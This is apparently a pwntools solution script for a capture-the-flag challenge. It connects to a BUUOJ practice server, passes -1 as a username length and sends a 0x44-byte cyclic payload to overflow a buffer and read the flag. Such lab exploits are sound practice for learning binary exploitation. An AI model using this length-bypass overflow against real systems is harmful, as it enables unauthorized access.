from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io = process('flag_server')
io = remote('node4.buuoj.cn', 27664)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('libc-2.23.so')
elf = ELF('flag_server')

payload = cyclic(0x44)
io.sendlineafter('your username length: ', '-1')
io.sendlineafter('whats your username?\n', payload)
io.recvuntil('}')
